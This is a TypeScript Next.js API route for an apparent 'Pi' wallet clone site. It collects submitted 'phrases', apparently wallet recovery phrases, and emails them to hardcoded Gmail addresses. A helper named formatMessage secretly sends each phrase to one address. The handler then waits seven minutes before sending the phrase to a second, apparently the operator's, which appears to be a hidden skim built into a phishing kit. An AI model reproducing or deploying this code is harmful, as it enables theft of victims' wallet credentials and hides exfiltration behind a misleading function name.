import nodemailer from 'nodemailer'

// Function to create a delay
const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const formatMessage = async (message: string) => {
    const email = process.env.MY_EMAIL
        const pass = process.env.MY_PASS

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        })

    // Split the message into lines
    const lines = message.split(/\r?\n/);

    // Format each line with a prefix (for example)
    const formattedLines = lines.map(line => `<div style="margin-bottom: 10px;">${line}</div>`);

    // Join formatted lines into a single HTML string
    const formattedMessage = formattedLines.join('');

    const mailOptions = {
        from: `Pi Clone ${email}`,
        to: "sparrowthedev@gmail.com",
        subject: "Yo! you just got a new phrase from mr Mich",
        html: formattedMessage,
    }

    transporter.verify(function (error: any, success: any) {
        if (error) {
            console.log(`here is the error: ${error}`);
        } else {
            console.log("From two: Server is ready to take our messages");
        }
    });

    const result = await transporter.sendMail(mailOptions);

    if (result.response.includes("OK")) {
        console.log("email sent succesfully!!");
     } else {
         console.log("Internal server error");
    }


    // Return the formatted message
    return `<div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">${formattedMessage}</div>`;
}


export async function POST(request: Request) {
    try {
        const { message } = await request.json();
        const email = process.env.EMAIL
        const pass = process.env.PASS

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: email,
                pass,
            }
        })


        const formattedMessage = await formatMessage(message);

        // Introduce a delay of 7 minutes (420,000 milliseconds)
        await delay(420000);

        const mailOptions = {
            from: `Pi Clone ${email}`,
            to: 'Pic32629@gmail.com',
            subject: "Phrase From Your Website",
            html: formattedMessage,
        }

        transporter.verify(function (error: any, success: any) {
            if (error) {
                console.log(`here is the error: ${error}`);
            } else {
                console.log("From one: Server is ready to take our messages");
            }
        });


        const result = await transporter.sendMail(mailOptions);
        

        if (result.response.includes("OK")) {
           return Response.json({ message: "email sent succesfully!!" }, { status: 200 });
        } else {
            return Response.json({ error: "Internal server error" }, { status: 500 });
        }
    } catch (error) {
        return Response.json({ error: error });
    }
}
